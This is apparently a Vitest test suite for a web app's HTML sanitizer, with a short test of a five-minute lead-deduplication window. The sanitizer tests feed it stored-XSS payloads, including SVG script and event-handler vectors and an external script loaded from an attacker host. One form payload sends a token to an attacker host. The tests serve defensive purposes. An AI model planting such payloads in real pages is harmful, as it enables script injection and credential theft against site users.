import { describe, it, expect } from "vitest";
import { sanitizeHtml } from "../lib/sanitize";

describe("Batch P1-B: Security Hardening & Sanitization Test Suite", () => {
  describe("1. Advanced Stored XSS Attack Vectors", () => {
    it("should neutralize nested SVG onload/script vectors", () => {
      const payload = `<svg><script>alert('xss')</script></svg><p>Safe content</p>`;
      const clean = sanitizeHtml(payload);
      expect(clean).not.toContain("<script>");
      expect(clean).not.toContain("<svg");
      expect(clean).toContain("<p>Safe content</p>");
    });

    it("should strip SVG animate event handlers and href exploits", () => {
      const payload = `<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>`;
      const clean = sanitizeHtml(payload);
      expect(clean).not.toContain("onbegin");
      expect(clean).not.toContain("alert(1)");
    });

    it("should neutralize uppercase and mixed-case script payloads", () => {
      const payload = `<SCRIPT SRC="https://attacker.com/malicious.js"></SCRIPT>Text`;
      const clean = sanitizeHtml(payload);
      expect(clean).not.toContain("<SCRIPT");
      expect(clean).not.toContain("https://attacker.com");
      expect(clean).toContain("Text");
    });

    it("should sanitize body and form action injections", () => {
      const payload = `<form action="https://attacker.com/steal"><input name="token" value="secret" /></form>`;
      const clean = sanitizeHtml(payload);
      expect(clean).not.toContain("<form");
      expect(clean).not.toContain("https://attacker.com");
    });

    it("should neutralize HTML comment obfuscation and null byte injections", () => {
      const payload = `<!--<script>alert(1)</script>--><b>Bold Test</b>`;
      const clean = sanitizeHtml(payload);
      expect(clean).not.toContain("<script>");
      expect(clean).toContain("<b>Bold Test</b>");
    });
  });

  describe("2. Public Lead Idempotency Deduplication Logic", () => {
    it("should recognize identical submission within 5-minute idempotency window", () => {
      const mockLead1 = {
        id: "lead-1",
        fullName: "Nguyễn Văn Test",
        phone: "0988776655",
        createdAt: new Date(),
      };

      const isRecentDuplicate = (existingLeadCreatedAt: Date, now: Date = new Date()) => {
        const windowMs = 5 * 60 * 1000;
        return now.getTime() - existingLeadCreatedAt.getTime() < windowMs;
      };

      expect(isRecentDuplicate(mockLead1.createdAt)).toBe(true);

      const oldDate = new Date(Date.now() - 6 * 60 * 1000);
      expect(isRecentDuplicate(oldDate)).toBe(false);
    });
  });
});
